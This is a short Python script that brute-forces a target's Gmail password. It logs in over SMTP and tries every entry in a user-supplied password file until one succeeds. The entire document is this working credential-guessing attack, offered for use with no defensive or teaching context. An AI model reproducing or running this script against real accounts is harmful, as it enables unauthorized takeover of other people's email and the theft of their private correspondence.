#!/usr/bin/python

import smtplib
from termcolor import colored

smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("[*] Enter Target Email Address:")
passwordfile = raw_input("[*] Enter The Path To The Password File:")
file = open(passwordfile, "r")

for password in file:
	password = password.strip('\n')
	try:
		smtpserver.login(user,password)
		print(colored("[+] Password Fount: %s" % password, 'green'))
		break
	except smtplib.SMTPAuthenticationError:
		print(colored("[-] Wrong Password: "+ password, 'red'))
	
